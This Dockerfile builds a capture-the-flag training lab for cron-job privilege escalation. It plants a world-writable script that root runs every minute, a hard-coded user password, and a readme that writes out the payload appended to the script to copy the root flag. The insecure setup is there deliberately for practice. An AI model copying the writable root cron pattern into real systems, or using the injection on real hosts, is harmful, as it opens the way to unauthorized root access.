FROM ubuntu:22.04

RUN apt-get update && apt-get install -y cron sudo && rm -rf /var/lib/apt/lists/*

RUN useradd -m -s /bin/bash player && echo "player:player123" | chpasswd

RUN mkdir -p /opt/scripts && \
    printf '#!/bin/bash\n# System cleanup - runs as root every minute\nfind /tmp -name "*.tmp" -mtime +1 -delete 2>/dev/null\necho "Cleanup ran at $(date)" >> /var/log/cleanup.log\n' \
    > /opt/scripts/cleanup.sh && chmod 777 /opt/scripts/cleanup.sh

RUN echo "* * * * * root /opt/scripts/cleanup.sh" >> /etc/crontab

RUN echo "FLAG{cr0n_j0b_pr1v3sc_pwn3d}" > /root/flag.txt && chmod 600 /root/flag.txt

RUN echo "player ALL=(root) NOPASSWD: /usr/sbin/service cron start" > /etc/sudoers.d/player && \
    chmod 440 /etc/sudoers.d/player

RUN printf 'Cron Job Privilege Escalation\n==============================\nYou are logged in as "player" (low privilege).\nEscalate to root and read /root/flag.txt\n\nHints:\n  1. Check scheduled cron jobs:  cat /etc/crontab\n  2. Check permissions:          ls -la /opt/scripts/\n  3. If you find a writable root-owned cron script, inject a payload:\n       echo "cp /root/flag.txt /tmp/f.txt; chmod 777 /tmp/f.txt" >> /opt/scripts/cleanup.sh\n  4. Start cron if not running:   sudo service cron start\n  5. Wait ~60 seconds then:       cat /tmp/f.txt\n' \
    > /home/player/readme.txt && chown player:player /home/player/readme.txt

WORKDIR /home/player
USER player
CMD ["/bin/bash", "-c", "sudo service cron start 2>/dev/null; exec bash"]
